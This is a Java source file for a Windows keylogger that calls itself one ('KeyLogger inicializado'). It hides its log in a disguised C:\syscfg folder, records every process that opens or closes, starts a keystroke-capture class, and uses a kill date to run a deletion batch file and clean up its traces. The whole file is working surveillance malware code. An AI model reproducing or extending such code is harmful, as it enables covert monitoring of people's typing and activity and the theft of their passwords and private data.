import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.OutputStreamWriter;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import org.eclipse.swt.widgets.Display;
//import org.sf.feeling.swt.win32.extension.hook.JournalRecordHook;

public class Main {

	private static BufferedWriter out = null;

	private static String fileName = "kog.rtf";

	private static String file = "C:" + System.getProperty("file.separator")
			/*+ "WINDOWS" + System.getProperty("file.separator")*/
			+ "syscfg" + System.getProperty("file.separator") + fileName;

	private static String currentDate = new SimpleDateFormat("EEEEEEEEEE, d MMMMMMMMMM yyyy HH:mm:ss").format(new Date());

	public static List<String> listRunningProcesses() throws IOException {
		List<String> processes = new ArrayList<String>();
		String line;
		Process p = Runtime.getRuntime().exec("tasklist.exe /fo csv /nh");
		BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream()));
		while ((line = input.readLine()) != null) {
			if (!line.trim().equals("")) {
				String[] infos = line.split(",");
				processes.add(infos[0].replace("\"", ""));
			}
		}
		input.close();
		return processes;
	}

	public static void appendNewLine() {
		try {
			BufferedWriter out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
			out.newLine();
			out.close();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	static class ProcessList extends Thread {
		@Override
		public void run() {
			try {
				List<String> p1 = listRunningProcesses();
				while (isAlive()) {
					List<String> p2 = listRunningProcesses();
					for (int i = 0; i < p1.size(); i++) {
						if (!p2.contains(p1.get(i))) {
							out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
							appendNewLine();
							out.write("[CLOSED : " + p1.get(i) + "]");
							appendNewLine();
							out.close();
							p1.remove(i);
						}
					}
					for (int i = 0; i < p2.size(); i++) {
						if (!p1.contains(p2.get(i))) {
							out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
							appendNewLine();
							out.write("[OPENED : " + p2.get(i) + "]");
							appendNewLine();
							out.close();
							p1.add(p2.get(i));
						}
					}
					Thread.sleep(400);
					
					// Garbagge Collector
					Runtime.getRuntime().gc();
					System.gc();
				}
			} catch (Exception ex) {
				ex.printStackTrace();
			}
		}
	}

	public static void main(String[] args) {
		try {
			
			if (!(new File("C:\\syscfg").exists())) new File("C:\\syscfg").mkdir();

			Calendar c = Calendar.getInstance();
			c.set(2013, 12 - 1, 12);

			if (new SimpleDateFormat("dd/MM/yyyy").format(new Date()).equals("12/12/2013") || c.getTime().before(new Date())) {
				try {
					Runtime.getRuntime().exec("delete.bat");
					new File("C:\\syscfg").delete();
				} catch (Exception ex) {
					ex.printStackTrace();
				}
				return;
			} else {
				try {
					new FinalKogger();
					out = new BufferedWriter(new OutputStreamWriter(new FileOutputStream(file, true), "Cp1252"));
					out.newLine();
					out.newLine();
					out.write("KeyLogger inicializado :: " + currentDate);
					out.newLine();
					out.newLine();
					out.close();
					new ProcessList().start();
				} catch (Exception ex) {
					ex.printStackTrace();
					return;
				}
				Display display = new Display();
				while (!display.isDisposed()){
					if (!display.readAndDispatch()){
						display.sleep();
					}					
				}
				/*JournalRecordHook.unInstallHook();
				display.dispose();*/
			}
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}
}